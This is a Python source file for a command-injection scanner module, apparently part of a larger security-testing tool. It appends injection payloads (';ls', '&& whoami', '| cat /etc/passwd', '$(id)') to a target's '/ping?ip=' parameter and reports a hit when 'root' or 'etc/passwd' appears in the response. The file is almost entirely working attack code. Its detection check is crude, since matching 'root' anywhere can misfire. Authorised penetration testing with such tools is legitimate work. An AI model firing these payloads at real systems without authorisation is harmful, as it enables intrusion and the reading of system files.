# modules/scanners/rce_scanner.py
from core.scanner_base import ScannerBase
from core.report_manager import ReportManager

class RCEScanner(ScannerBase):
    def __init__(self, target):
        super().__init__(target)
        self.report = ReportManager("rce_scan")

    def scan(self):
        print("""
        ╔════════════════════════════╗
        ║     💣 RCE SCANNER 💣      ║
        ╚════════════════════════════╝
        """)
        
        print(f"[*] Scanning {self.target} for RCE vulnerabilities...")
        
        payloads = [
            ';ls',
            '&& whoami',
            '| cat /etc/passwd',
            '$(id)'
        ]
        
        vulnerable = False
        
        for payload in payloads:
            test_url = f"{self.target}/ping?ip=127.0.0.1{payload}"
            print(f"[*] Testing payload: {payload[:20]}...")
            
            resp = self._send_request(test_url)
            if resp and ("root" in resp.text or "etc/passwd" in resp.text):
                print(f"[!] Potential RCE found with payload: {payload[:20]}...")
                self.report.add_result(f"RCE Vulnerability: {test_url}")
                vulnerable = True
                
        if not vulnerable:
            print("[+] No RCE vulnerabilities detected")
            self.report.add_result("No RCE vulnerabilities found")
            
        self.report.save()
